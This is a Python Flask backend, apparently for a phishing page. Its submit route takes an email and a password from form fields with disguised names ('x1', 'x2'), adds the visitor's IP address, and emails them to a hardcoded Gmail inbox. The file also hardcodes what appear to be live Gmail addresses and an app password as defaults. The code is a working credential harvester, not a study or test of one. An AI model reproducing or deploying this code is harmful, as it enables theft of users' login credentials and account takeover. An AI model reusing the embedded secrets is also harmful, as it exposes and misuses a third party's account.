from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import smtplib
from email.message import EmailMessage
import os
import logging

app = Flask(__name__, template_folder='.', static_folder='.', static_url_path='')
CORS(app)  # Allow requests from your frontend

# Configuration
EMAIL_SENDER = os.environ.get('EMAIL_SENDER', 'nwekee125@gmail.com')
# IMPORTANT: Use a Gmail App Password, not your regular Gmail password.
# See: https://support.google.com/accounts/answer/185833
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', 'mhhihywubresapns')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'maxwell202201@gmail.com')


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('x1')  # This is the email from the frontend
    password = request.form.get('x2')
    ip_address = request.remote_addr

    # Compose email
    msg = EmailMessage()
    msg['Subject'] = 'New Form Submission (Student Project)'
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg.set_content(f"""
    Email: {email}
    Password: {password}
    IP Address: {ip_address}
    """)

    # Send email
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
        return jsonify({'status': 'success'})
    except smtplib.SMTPAuthenticationError as e:
        logging.error(f"SMTP Authentication Error: {e}")
        return jsonify({
            'status': 'error',
            'message': 'SMTP Authentication failed. Please check your Gmail App Password and account security settings.'
        }), 500
    except Exception as e:
        logging.error(f"Error sending email: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
